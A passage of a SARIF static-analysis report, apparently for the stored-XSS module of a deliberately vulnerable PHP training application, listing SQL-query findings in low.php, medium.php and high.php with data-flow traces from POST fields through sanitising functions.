            "uri" : "vulnerabilities/xss_s/source/high.php"
          },
          "region" : {
            "startLine" : 19,
            "endLine" : 19,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Read $_POST['mtxMessage']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:19 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Read $_POST['mtxMessage']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - trim(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Assignment to $message"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:9 - addslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:9 - strip_tags(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:9 - Assignment to $message"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:10 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:10 - Assignment to $message"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:11 - htmlspecialchars(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:11 - Assignment to $message"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:18 - Assignment to $query"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:19 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4740",
      "message" : {
        "text" : "Line 19 of high.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F22F5A676B00BDD0033C29570151F880"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/xss_s/source/high.php"
          },
          "region" : {
            "startLine" : 19,
            "endLine" : 19,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:6 - Read $_POST['txtName']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:19 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:6 - Read $_POST['txtName']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:6 - trim(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:6 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:14 - preg_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:14 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:15 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:15 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:18 - Assignment to $query"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:19 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/high.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4566",
      "message" : {
        "text" : "Line 17 of low.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "7D66310E40EDE6C7306D2062FFC93F9C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/xss_s/source/low.php"
          },
          "region" : {
            "startLine" : 17,
            "endLine" : 17,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:6 - Read $_POST['txtName']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/low.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:17 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/low.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:6 - Read $_POST['txtName']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/low.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:6 - trim(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/low.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:6 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/low.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:13 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/low.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:13 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/low.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:16 - Assignment to $query"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/low.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:17 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/low.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4749",
      "message" : {
        "text" : "Line 17 of low.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F6A1BEC8B249221E3EF723823443735D"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/xss_s/source/low.php"
          },
          "region" : {
            "startLine" : 17,
            "endLine" : 17,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_POST['mtxMessage']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:17 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/low.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_POST['mtxMessage']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - trim(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Assignment to $message"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:9 - stripslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/low.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:9 - Assignment to $message"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/low.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:10 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/low.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:10 - Assignment to $message"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/low.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:16 - Assignment to $query"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/low.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:17 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/low.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4447",
      "message" : {
        "text" : "Line 19 of medium.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "37AE1279E8B571005C80D6BF68D9CC7C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/xss_s/source/medium.php"
          },
          "region" : {
            "startLine" : 19,
            "endLine" : 19,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_POST['mtxMessage']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:19 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_POST['mtxMessage']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - trim(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Assignment to $message"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:9 - addslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:9 - strip_tags(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:9 - Assignment to $message"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:10 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:10 - Assignment to $message"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:11 - htmlspecialchars(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:11 - Assignment to $message"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:18 - Assignment to $query"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:19 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4710",
      "message" : {
        "text" : "Line 19 of medium.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "E2D27723E0050048E83DA5B76DEC83CA"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/xss_s/source/medium.php"
          },
          "region" : {
            "startLine" : 19,
            "endLine" : 19,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:6 - Read $_POST['txtName']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:19 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:6 - Read $_POST['txtName']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:6 - trim(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:6 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 6
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:14 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:14 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:18 - Assignment to $query"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:19 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/source/medium.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          } ]
        } ]
      } ]
    } ]
  } ]
}